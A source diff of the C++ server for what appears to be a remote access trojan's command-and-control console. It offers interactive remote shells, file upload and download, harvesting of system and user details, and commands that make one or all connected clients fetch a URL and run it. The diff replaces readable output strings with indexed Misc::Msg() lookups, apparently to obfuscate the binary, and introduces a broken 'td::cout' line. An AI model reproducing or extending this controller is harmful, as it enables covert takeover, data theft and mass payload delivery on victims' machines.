@@ -4,7 +4,7 @@
 
 void Server::PrintClientList(){
 	if(iClientsOnline <= 0){
-		std::cout<<"\n\tNo clients online\n";
+		std::cout<<Misc::Msg(0);
 		return;
 	}
 	std::vector<std::string> vHeaders;
@@ -65,10 +65,10 @@ void Server::FreeAllClients(){
 }
 
 bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID, char cRun) {
-	std::cout<<"Sending "<<strLocalFile<<'\n';
+	std::cout<<Misc::Msg(1)<<strLocalFile<<'\n';
 	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
 	if(!strmInputFile.is_open()){
-		std::cout<<"Unable to open file\n";
+		std::cout<<Misc::Msg(2);
 		error();
 		return false;
 	}
@@ -95,14 +95,14 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 		char tmpBuffer[4];
 		if(SSL_read(Clients[iClientID]->sslSocket, tmpBuffer, 3) > 2){
 			if(tmpBuffer[0] == 'f' && tmpBuffer[1] == '@' && tmpBuffer[2] == '1'){
-				std::cout<<"Transfer confirmation\n";
+				std::cout<<Misc::Msg(3);
 			} else {
-				std::cout<<"Not confirmed, cancel transfer...\n";
+				std::cout<<Misc::Msg(4);
 				strmInputFile.close();
 				return false;
 			}
 		} else {
-			std::cout<<"Didnt receive confirmation from client\n";
+			std::cout<<Misc::Msg(5);
 			error();
 			strmInputFile.close();
 		}
@@ -118,7 +118,7 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 					Misc::ProgressBar(uBytesSent, uFileSize);
 					std::fflush(stdout);
 				} else {
-					std::cout<<"Unable to send file bytes\n";
+					std::cout<<Misc::Msg(6);
 					error();
 					break;
 				}
@@ -126,10 +126,10 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 				break;
 			}
 		}
-		std::cout<<"\nTransfer done "<<uBytesSent<<" bytes\n";
+		std::cout<<Misc::Msg(7)<<uBytesSent<<" bytes\n";
 		Misc::Free(cFileBuffer, iBlockSize);
 	} else {
-		std::cout<<"Unable to send command to client\n";
+		std::cout<<Misc::Msg(8);
 		error();
 		strmInputFile.close();
 		return false;
@@ -139,7 +139,7 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 }
 
 bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
-	std::cout<<"Downloading file "<<strRemoteFileName<<'\n';
+	std::cout<<Misc::Msg(9)<<strRemoteFileName<<'\n';
 	std::string cLocalName = "";
 	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
 	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
@@ -154,7 +154,7 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 	cLocalName.append(1, ' ');
 	cLocalName.append(std::asctime(std::localtime(&tTime)));
 	cLocalName[cLocalName.length()-1] = '\0';
-	std::cout<<"Local file : "<<cLocalName<<'\n';
+	std::cout<<Misc::Msg(10)<<cLocalName<<'\n';
 	Misc::strReplaceSingleChar(cLocalName, ':', '-');
 	std::string strCmdLine = CommandCodes::cDownload;
 	strCmdLine.append(strRemoteFileName);
@@ -166,16 +166,16 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 		char *cFileBuffer = new char[iBufferSize];
 		if(SSL_read(Clients[iClientID]->sslSocket, cFileSizeBuffer, 19) > 0){
 			if(strncmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel, strlen(CommandCodes::cFileTransferCancel)) == 0){
-				std::cout<<"Unable to download remote file\n";
+				std::cout<<Misc::Msg(11);
 				return false;
 			}
 			tkToken = cFileSizeBuffer;
 			tkToken += 2;
 			sscanf(tkToken, "%llui", &uFinalSize);
-			std::cout<<"File size is "<<uFinalSize<<'\n';
+			std::cout<<Misc::Msg(12)<<uFinalSize<<'\n';
 			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
 			if(!strmOutputFile.is_open()){
-				std::cout<<"Unable to open file "<<cLocalName<<'\n';
+				std::cout<<Misc::Msg(13)<<cLocalName<<'\n';
 				error();
 				return false;	
 			} else {
@@ -191,17 +191,17 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 					}				
 				}
 				strmOutputFile.close();
-				std::cout<<"\nTransfer done!\n";
+				std::cout<<Misc::Msg(7);
 			}
 		} else {
 			Misc::Free(cFileBuffer, iBufferSize);
-			std::cout<<"Unable to receive remote filesize\n";
+			std::cout<<Misc::Msg(14);
 			error();
 			return false;
 		}
 		Misc::Free(cFileBuffer, iBufferSize);
 	} else {
-		std::cout<<"Unable to send command to client\n";
+		std::cout<<Misc::Msg(8);
 		error();
 		return false;
 	}
@@ -209,7 +209,7 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 }
 
 void Server::ParseClientCommand(std::string strCommand, int iClientID){
-	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
+	if(strCommand == "?" || strCommand == Misc::Msg(15) || strCommand == "aiuda"){
 		Help(std::string("client"), Clients[iClientID]->strOS == "Linux" ? 1 : 0);
 		return;
 	}
@@ -252,26 +252,26 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 										}
 										iStrLen = strlen(cCmdLine);
 										if(SSL_write(Clients[iClientID]->sslSocket, cCmdLine, iStrLen) <= 0){
-											std::cout<<"Unable to send command to client\n";
+											std::cout<<Misc::Msg(8);
 											error();
 											isReadingShell = false;
 											break;
 										}
-										if(strncmp(cCmdLine, "exit\n", 5) == 0){
-											std::cout<<"\nBye\n";
+										if(strncmp(cCmdLine, Misc::Msg(67), 5) == 0){
+											std::cout<<Misc::Msg(16);
 											isReadingShell = false;
 											break;
 										}
 									}
 									thCmd.join();
 								} else {													
-									std::cout<<"Shell not spawned\n";					
+									std::cout<<Misc::Msg(17);				
 								}														
 						} else {
-							std::cout<<"Unable to read response from client\n";
+							std::cout<<Misc::Msg(18);
 						}
 					} else {
-						std::cout<<"Unable to send command to client\n";
+						std::cout<<Misc::Msg(8);
 						error();
 					}
 					mtxLock();
@@ -279,7 +279,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					mtxUnlock();
 				}
 			} else {
-				std::cout<<"\n\tUse shell -c path_to_shell\n";
+				std::cout<<Misc::Msg(19);
 			}
 			return;
 		}
@@ -297,25 +297,25 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 							cBufferInfo[iBytes] = '\0';
 							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 0 : 1);
 						} else {
-							std::cout<<"Unable to retrieve information from client\n";
+							std::cout<<Misc::Msg(20);
 							error();
 						}
 					} else {
-						std::cout<<"Unable to send command to client\n";
+						std::cout<<Misc::Msg(8);
 						error();
 					}
 					delete[] cBufferInfo;
 					cBufferInfo = nullptr;
 				}
 			} else {
-				std::cout<<"\n\tUse info -b (Basic)\n";
+				std::cout<<Misc::Msg(21);
 			}
 			mtxLock();
 			Clients[iClientID]->isFlag = false;
 			mtxUnlock();	
 			return;
 		}
-		if(vcClientCommands[0] == "download"){
+		if(vcClientCommands[0] == Misc::Msg(22)){
 			if(vcClientCommands.size() == 3){
 				if(vcClientCommands[1] == "-r"){
 					mtxLock();
@@ -327,11 +327,11 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					mtxUnlock();
 				}
 			} else {
-				std::cout<<"\n\tUse download -r remotefilename\n";
+				std::cout<<Misc::Msg(23);
 			}
 			return;
 		}
-		if(vcClientCommands[0] == "upload"){
+		if(vcClientCommands[0] == Misc::Msg(24)){
 			if(vcClientCommands.size() == 5){
 				mtxLock();
 				Clients[iClientID]->isFlag = true;
@@ -350,13 +350,13 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				if(strRemoteFile != "" && strLocalFile != ""){
 					SendFile(strRemoteFile, strLocalFile, iClientID, '0'); //check return boolean
 				} else {
-					std::cout<<"Invalid filenames\n";
+					std::cout<<Misc::Msg(25);
 				}
 				mtxLock();
 				Clients[iClientID]->isFlag = false;
 				mtxUnlock();
 			} else {
-				std::cout<<"\n\tUse upload -l local_filename -r remote_filename\n";
+				std::cout<<Misc::Msg(26);
 			}
 			return;
 		}
@@ -385,23 +385,23 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				strCommandLine.append(3, 'A');
 				iLen = strCommandLine.length();
 				if(SSL_write(Clients[iClientID]->sslSocket, strCommandLine.c_str(), iLen) > 0){
-					std::cout<<"\n\tSent\n";
+					std::cout<<Misc::Msg(27);
 				} else {
-					std::cout<<"Unable to send command to client\n";
+					std::cout<<Misc::Msg(8);
 					error();
 				}
 				mtxLock();
 				Clients[iClientID]->isFlag = false;
 				mtxUnlock();
 			} else {
-				std::cout<<"\n\tUse httpd -u <url> -r <yes|no> (Execute)\n";
+				std::cout<<Misc::Msg(28);
 			}
 		}
 	}
 }
 
 void Server::ParseMassiveCommand(std::string strCommand){
-	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
+	if(strCommand == "?" || strCommand == Misc::Msg(15) || strCommand == "aiuda"){
 		Help(std::string("massive"),0);
 		return;
 	}
@@ -417,7 +417,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 		return;
 	}
 	if(vcMassiveCommands.size() > 0){
-		if(vcMassiveCommands[0] == "upload"){
+		if(vcMassiveCommands[0] == Misc::Msg(24)){
 			if(vcMassiveCommands.size() == 7){
 				std::string strLocalFile = "";
 				std::string strOS = "";
@@ -428,7 +428,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 						continue;
 					}
 					if(vcMassiveCommands[iIt] == "-r"){
-						cExec = vcMassiveCommands[iIt+1] == "yes" ? '1' : '0';
+						cExec = vcMassiveCommands[iIt+1] == Misc::Msg(76) ? '1' : '0';
 						continue;
 					}
 					if(vcMassiveCommands[iIt] == "-o"){
@@ -445,7 +445,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 				}
 				if(strLocalFile.length() > 0 && strOS != ""){
 					if(iClientsOnline > 0){
-						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
+						std::cout<<Misc::Msg(29)<<iClientsOnline<<Misc::Msg(30);
 						std::string strRemoteFile = "";
 						char cBufferTmp[261];
 						strncpy(cBufferTmp, strLocalFile.c_str(), 260);
@@ -461,10 +461,9 @@ void Server::ParseMassiveCommand(std::string strCommand){
 									Clients[iIt2]->isFlag = true;
 									mtxUnlock();
 									if(SendFile(strRemoteFile, strLocalFile, iIt2, cExec)){
-										std::cout<<"Client ["<<iIt2<<"] success\n";
+										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(32);
 									} else {
-										std::cout<<"Client ["<<iIt2<<"] fail\n";
-										//error();
+										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(33);
 									}
 									mtxLock();
 									Clients[iIt2]->isFlag = false;
@@ -473,13 +472,13 @@ void Server::ParseMassiveCommand(std::string strCommand){
 							}
 						}
 					} else {
-						std::cout<<"No clients online\n";
+						std::cout<<Misc::Msg(0);
 					}
 				} else {
-					std::cout<<"Error parsing arguments\n";
+					std::cout<<Misc::Msg(34);
 				}
 			} else {
-				std::cout<<"\n\tUse upload -l local_filename -r yes|no -o windows|linux|*\n";
+				std::cout<<Misc::Msg(35);
 			}
 			return;
 		}
@@ -495,7 +494,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 						continue;
 					}
 					if(vcMassiveCommands[iIt2] == "-r"){
-						cExec = vcMassiveCommands[iIt2+1] == "yes" ? '1' : '0';
+						cExec = vcMassiveCommands[iIt2+1] == Misc::Msg(76) ? '1' : '0';
 						continue;
 					}
 					if(vcMassiveCommands[iIt2] == "-o"){
@@ -512,7 +511,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 				}
 				if(strUrl.length() > 0 && strOS != ""){
 					if(iClientsOnline > 0){
-						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
+						std::cout<<Misc::Msg(29)<<iClientsOnline<<Misc::Msg(30);
 						std::string strCmdLine = CommandCodes::cHttpd;
 						strCmdLine.append(strUrl);
 						strCmdLine.append(1, '@');
@@ -527,9 +526,9 @@ void Server::ParseMassiveCommand(std::string strCommand){
 									Clients[iIt2]->isFlag = true;
 									mtxUnlock();
 									if(SSL_write(Clients[iIt2]->sslSocket, strCmdLine.c_str(), iLen) > 0){
-										std::cout<<"Client ["<<iIt2<<"] success\n";
+										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(32);
 									} else {
-										std::cout<<"Client ["<<iIt2<<"] fail\n";
+										std::cout<<Misc::Msg(31)<<iIt2<<Misc::Msg(33);
 									}
 									mtxLock();
 									Clients[iIt2]->isFlag = false;
@@ -538,13 +537,13 @@ void Server::ParseMassiveCommand(std::string strCommand){
 							}
 						}
 					} else {
-						std::cout<<"No clients online\n";
+						std::cout<<Misc::Msg(0);
 					}
 				} else {
-					std::cout<<"Error parsing arguments\n";
+					std::cout<<Misc::Msg(34);
 				}
 			} else {
-				std::cout<<"\n\tUse httpd -u http://url/to/file -r yes|no -o windows|linux|*\n";
+				std::cout<<Misc::Msg(36);
 			}	
 		} 
 		return;
@@ -557,19 +556,19 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 			std::vector<std::string> vcWinInfo;
 			Misc::strSplit(cBuffer, '|', vcWinInfo, 7);
 			if(vcWinInfo.size() >= 7){
-				std::cout<<Bold0 "Current User:     "<<vcWinInfo[0]<<"\n";
-				std::cout<<"Operating System: "<<vcWinInfo[4]<<"\n";
-				std::cout<<"RAM(Mb):          "<<vcWinInfo[5]<<"\nCpuInfo:\n" CReset;
+				std::cout<<Bold0<<Misc::Msg(37)<<vcWinInfo[0]<<"\n";
+				std::cout<<Misc::Msg(38)<<vcWinInfo[4]<<"\n";
+				std::cout<<Misc::Msg(39)<<vcWinInfo[5]<<"\nCpuInfo:\n" CReset;
 				std::vector<std::string> vcCpuHead, vcCpu, vcDrivesHead, vcDrives, vcTmp, vcUsers, vcUsersHead;
-				vcCpuHead.push_back("Model");
-				vcCpuHead.push_back("Architecture");
-				vcUsersHead.push_back("Name");
-				vcUsersHead.push_back("Admin?");
+				vcCpuHead.push_back(Misc::Msg(40));
+				vcCpuHead.push_back(Misc::Msg(41));
+				vcUsersHead.push_back(Misc::Msg(42));
+				vcUsersHead.push_back(Misc::Msg(43));
 				vcDrivesHead.push_back("-");
-				vcDrivesHead.push_back("Label");
-				vcDrivesHead.push_back("Type");
-				vcDrivesHead.push_back("Free");
-				vcDrivesHead.push_back("Total");
+				vcDrivesHead.push_back(Misc::Msg(44));
+				vcDrivesHead.push_back(Misc::Msg(45));
+				vcDrivesHead.push_back(Misc::Msg(46));
+				vcDrivesHead.push_back(Misc::Msg(47));
 				vcCpu.push_back(vcWinInfo[3]);
 				Misc::PrintTable(vcCpuHead, vcCpu, '^');
 				std::string strTmpUsers = "";
@@ -581,35 +580,35 @@ void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
 						strTmpUsers.erase(strTmpUsers.begin(), strTmpUsers.end());
 						strTmpUsers.append(vcTmp2[0]);
 						strTmpUsers.append(1, '/');
-						strTmpUsers.append((vcTmp2[1] == "1") ? "Yes" : "No");
+						strTmpUsers.append((vcTmp2[1] == "1") ? Misc::Msg(77) : Misc::Msg(78));
 						vcUsers.push_back(strTmpUsers);
 					}
 				}
-				std::cout<<Bold0 "\nUser List:\n" CReset;
+				std::cout<<Bold0<<Misc::Msg(48)<<CReset;
 				Misc::PrintTable(vcUsersHead, vcUsers, '/');
-				std::cout<<Bold0 "\nStorage Information:\n" CReset;
+				std::cout<<Bold0<<Misc::Msg(49)<<CReset;
 				Misc::strSplit(vcWinInfo[1], '*', vcDrives, 200);
 				Misc::PrintTable(vcDrivesHead, vcDrives, '/');
 			} else {
-				std::cout<<"Unable to parse info\n"<<cBuffer<<"\n";
+				std::cout<<Misc::Msg(50)<<cBuffer<<"\n";
 			} 
 		} else {
 			std::vector<std::string> vcNixInfo;
 			Misc::strSplit(cBuffer, '|', vcNixInfo, 10);
 			if(vcNixInfo.size() >= 8){
-				std::cout<<Bold0 "System:   "<<vcNixInfo[5]<<'\n';
-				std::cout<<"Cpu:      "<<vcNixInfo[3]<<'\n';
-				std::cout<<"Cores:    "<<vcNixInfo[4]<<'\n';
-				std::cout<<"RAM(Mb):  "<<vcNixInfo[6]<<'\n';
-				std::cout<<"\nCurrent User: "<<vcNixInfo[0]<<"\nUsers list:\n" CReset;
+				std::cout<<Bold0<<Misc::Msg(51)<<vcNixInfo[5]<<'\n';
+				std::cout<<Misc::Msg(81)<<vcNixInfo[3]<<'\n';
+				std::cout<<Misc::Msg(52)<<vcNixInfo[4]<<'\n';
+				std::cout<<Misc::Msg(53)<<vcNixInfo[6]<<'\n';
+				std::cout<<Misc::Msg(54)<<vcNixInfo[0]<<Misc::Msg(48)<<CReset;
 				std::vector<std::string> vHeaders, vcUsers, vfUsers, vShells;
-				vHeaders.push_back("Username");
+				vHeaders.push_back(Misc::Msg(42));
 				vHeaders.push_back("Shell");
 				Misc::strSplit(vcNixInfo[2].c_str(), '*', vcUsers, 100);
 				Misc::PrintTable(vHeaders, vcUsers, ':');
-				std::cout<<Bold0 "\nSystem partitions:\n" CReset;
-				vHeaders[0] = "Partition";
-				vHeaders[1] = "Size(Gb)";
+				std::cout<<Bold0<<Misc::Msg(56)<<CReset;
+				vHeaders[0] = Misc::Msg(57);
+				vHeaders[1] = Misc::Msg(58);
 				std::vector<std::string> vcPartitions;
 				Misc::strSplit(vcNixInfo[1].c_str(), '*', vcPartitions, 100);
 				Misc::PrintTable(vHeaders, vcPartitions, ':');
@@ -629,7 +628,7 @@ bool Server::Listen(){
 	}
 	SSL_CTX_set_options(sslCTX, SSL_OP_NO_COMPRESSION | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
 	if(SSL_CTX_use_certificate_file(sslCTX, "./cacer.pem", SSL_FILETYPE_PEM) <= 0){
-		std::cout<<"Unable to use certificate\n";
+		std::cout<<Misc::Msg(60);
 		error();
 		return false;
 	}
@@ -638,7 +637,7 @@ bool Server::Listen(){
 		return false;
 	}
 	if(!SSL_CTX_check_private_key(sslCTX)){
-		std::cout<<"Error invalid private key\n";
+		std::cout<<Misc::Msg(61);
 		error();
 		return false;
 	}
@@ -740,7 +739,7 @@ void Server::threadListener(){
 		if(tmpSck != -1){
 			Clients[iClientCount] = new Client_Struct;
 			if(Clients[iClientCount] == nullptr){
-				std::cout<<"Error allocating memory for new client\n";
+				std::cout<<Misc::Msg(64);
 				error();
 				if(cRemoteAddress != nullptr){
 					delete[] cRemoteAddress;
@@ -775,11 +774,11 @@ void Server::threadListener(){
 				delete[] cRemoteAddress;
 				cRemoteAddress = nullptr;
 			} else {
-				std::cout<<"error obtaining remote address\n";
+				std::cout<<"IP Error\n";
 				error();
 				strTMPip = "dummyIP:8888";
 			}
-			std::cout<<"\nNew connection from "<<strTMPip<<'\n';
+			std::cout<<Misc::Msg(63)<<strTMPip<<'\n';
 			
 			char cTmpBuffer[20];
 			int iBytes = SSL_read(Clients[iClientCount]->sslSocket, cTmpBuffer, 19);
@@ -787,7 +786,7 @@ void Server::threadListener(){
 				cTmpBuffer[iBytes] = '\0';
 				Clients[iClientCount]->strOS = cTmpBuffer[0] == '0' && cTmpBuffer[1] == '1' ? "Linux" : "Windows";
 			} else {
-				Clients[iClientCount]->strOS = "unkn0w";
+				Clients[iClientCount]->strOS = Misc::Msg(65);
 			}
 			Clients[iClientCount]->strIP = strTMPip;
 			
@@ -825,7 +824,7 @@ void Server::threadMasterCMD(){
 		if(strCMD.length() <= 0){
 			continue;
 		}
-		if(strCMD == "?" || strCMD == "help" || strCMD == "aiuda"){
+		if(strCMD == "?" || strCMD == Misc::Msg(15) || strCMD == "aiuda"){
 			Help(std::string("main"), 0);
 			continue;
 		}
@@ -843,14 +842,11 @@ void Server::threadMasterCMD(){
 			continue;
 		}
 		//exit program
-		if(vcCommands[0] == "exit"){
-			std::cout<<"bye\n";
-			//close(sckMainSocket);       ClOSE LISTENERS
+		if(vcCommands[0] == Misc::Msg(80)){
+			std::cout<<Misc::Msg(16);
 			break;
 		}
-		if(iClientsOnline == 0){
-			continue;
-		}
+
 		//interact with clients
 		if(vcCommands[0] == "cli"){
 			if(vcCommands.size() == 5){ //cli -c id -a action
@@ -869,7 +865,7 @@ void Server::threadMasterCMD(){
 					}
 				}
 				if(Clients[iClientId] != nullptr){
-					if(strAction == "interact"){
+					if(strAction == Misc::Msg(66)){
 						//spawn prompt to interact with specified client
 						std::string strClientCmd = "";
 						std::string strPrompt = "[" + std::to_string(Clients[iClientId]->iID) + "]" + Clients[iClientId]->strIP + "@" + Clients[iClientId]->strOS + "#";
@@ -884,20 +880,20 @@ void Server::threadMasterCMD(){
 								continue;
 							}
 							ParseClientCommand(strClientCmd, iClientId);
-						}while(strClientCmd != "exit");
-					}else if(strAction == "close"){ //close client conenction
+						}while(strClientCmd != Misc::Msg(80));
+					}else if(strAction == Misc::Msg(68)){ //close client conenction
  						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
 							if(SSL_write(Clients[iClientId]->sslSocket, CommandCodes::cClose, 5) <= 0){
-								std::cout<<"Unable to send close command\n";
+								std::cout<<Misc::Msg(8);
 								error();
 								ERR_print_errors_fp(stderr);
 							}
 						} else {
-							std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
+							std::cout<<Misc::Msg(69)<<iClientId<<Misc::Msg(70);
 						}	
 					}
 				} else {
-					std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
+					std::cout<<Misc::Msg(69)<<iClientId<<Misc::Msg(70);
 				}
 				continue;
 			}
@@ -905,13 +901,13 @@ void Server::threadMasterCMD(){
 				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
 					std::string strMassiveCmd = "";
 					do{
-						std::cout<<"["<<iClientsOnline<<"] online# ";
+						td::cout<<"["<<iClientsOnline<<"] "<<Misc::Msg(79);
 						std::getline(std::cin, strMassiveCmd);
 						if(strMassiveCmd.length() == 0){
 							continue;
 						}
 						ParseMassiveCommand(strMassiveCmd);
-					}while(strMassiveCmd != "exit");
+					}while(strMassiveCmd != Misc::Msg(80));
 				}
 				continue;
 			}
@@ -943,7 +939,7 @@ void Server::threadClientPing(){
 				} else {
 					int iBytes = SSL_write(Clients[iClientID]->sslSocket, "", 1);
 					if(iBytes != 1){
-						std::cout<<"\nClient["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
+						std::cout<<"\n"<<Misc::Msg(69)<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<Misc::Msg(73);
 						mtxLock();
 						Clients[iClientID]->isConnected = false;
 						iClientsOnline--;
@@ -968,7 +964,7 @@ void Server::threadRemoteCmdOutput(int iClientID){
 			if(iBytes > 0){
 				cCmdBuffer[iBytes] = '\0';
 				if(strncmp(cCmdBuffer, CommandCodes::cShellEnd, strlen(CommandCodes::cShellEnd)) == 0){
-					std::cout<<"\nRemote shell ends\n";
+					std::cout<<Misc::Msg(74);
 					isReadingShell = false;
 					break;
 				}
@@ -979,7 +975,7 @@ void Server::threadRemoteCmdOutput(int iClientID){
 				break;
 			}
 		} else {
-			std::cout<<"client doesnt exist or is not connected anymore\n";
+			std::cout<<Misc::Msg(75);
 			break;
 		}
 	}
@@ -988,49 +984,52 @@ void Server::threadRemoteCmdOutput(int iClientID){
 void Server::Help(const std::string strHelp, int iOS){
 	std::vector<std::string> vHeaders, vFields;
 	if(strHelp == "main"){
-		std::cout<<"cli - Command to interact with clients\n";
-		std::cout<<"Options:\n";
-		vHeaders.push_back("Parameter");
-		vHeaders.push_back("About");
-		vHeaders.push_back("Options");
-		vFields.push_back("-l,Display connected users");
-		vFields.push_back("-a,Action to run on selected client,interact / close");
-		vFields.push_back("-c,Client to run selected action,number / *");
+		std::cout<<Misc::Msg(109);
+		std::cout<<Misc::Msg(82);
+		std::cout<<Misc::Msg(83);
+		vHeaders.push_back(Misc::Msg(84));
+		vHeaders.push_back(Misc::Msg(85));
+		vHeaders.push_back(Misc::Msg(86));
+		vFields.push_back(Misc::Msg(87));
+		vFields.push_back(Misc::Msg(88));
+		vFields.push_back(Misc::Msg(89));
 		Misc::PrintTable(vHeaders, vFields, ',');
-		std::cout<<"Ej:  cli -c 0 -a interact\n";
-		std::cout<<"     Start interactive session with client 0\n\n";
-		std::cout<<"     cli -c 0 -a close\n";
-		std::cout<<"     Close connection with client 0 and terminate remote process\n\n";
-		std::cout<<"     cli -c *\n";
-		std::cout<<"     Start interactive session with all connected clients\n";
+		std::cout<<Misc::Msg(90);
+		std::cout<<Misc::Msg(91);
+		std::cout<<Misc::Msg(92);
+		std::cout<<Misc::Msg(93);
+		std::cout<<Misc::Msg(94);
+		std::cout<<Misc::Msg(95);
 		return;
 	}
 	if(strHelp == "client"){
-		std::cout<<"Available commands\n";
-		vHeaders.push_back("Command");
-		vHeaders.push_back("About");
-		vHeaders.push_back("Parameters");
+		std::cout<<Misc::Msg(96);
+		vHeaders.push_back(Misc::Msg(97));
+		vHeaders.push_back(Misc::Msg(85));
+		vHeaders.push_back(Misc::Msg(98));
 		if(iOS == 1){
-			vFields.push_back("shell,Start interactive shell with client,-c /path/to/shell");
-			vFields.push_back("download,Download a remote file,-r /path/to/file");
-			vFields.push_back("upload,Upload a local file to client,-l C:\\path\\to\\localfile,-r /path/remotefile");
+			vFields.push_back(Misc::Msg(99));
+			vFields.push_back(Misc::Msg(100));
+			vFields.push_back(Misc::Msg(101));
 		} else {
-			vFields.push_back("shell,Start interactive shell with client,-c C:\\path\\to\\shell.exe");
-			vFields.push_back("download,Download a remote file,-r C:\\path\\to\\file.txt");
-			vFields.push_back("upload,Upload a local file to client,-l C:\\path\\to\\localfile,-r C:\\remote\\filename");
+			vFields.push_back(Misc::Msg(102));
+			vFields.push_back(Misc::Msg(103));
+			vFields.push_back(Misc::Msg(104));
 		}
-		vFields.push_back("httpd,Force client to download file from a http/https server,-u url,-r yes/no (Execute)");
-		vFields.push_back("info,Retrieve basic info from client,-b (Basic)");
+		vFields.push_back(Misc::Msg(105));
+		vFields.push_back(Misc::Msg(106));
 		Misc::PrintTable(vHeaders, vFields, ',');
+		std::cout<<Misc::Msg(110)<<"\n";
 		return;
 	}
 	if(strHelp == "massive"){
-		vHeaders.push_back("Command");
-		vHeaders.push_back("About");
-		vHeaders.push_back("Parameters");
-		vFields.push_back("httpd,Force clients to download a file,-u url,-r yes/no,-o windows/linux/*");
-		vFields.push_back("upload,Send file to all clients,-l /path/to/file,-r yes/no (Execute),-o windows/linux/*");
+		vHeaders.push_back(Misc::Msg(97));
+		vHeaders.push_back(Misc::Msg(85));
+		vHeaders.push_back(Misc::Msg(98));
+		vFields.push_back(Misc::Msg(107));
+		vFields.push_back(Misc::Msg(108));
 		Misc::PrintTable(vHeaders, vFields, ',');
+		std::cout<<Misc::Msg(110)<<"\n";
 		return;
 	}
 }
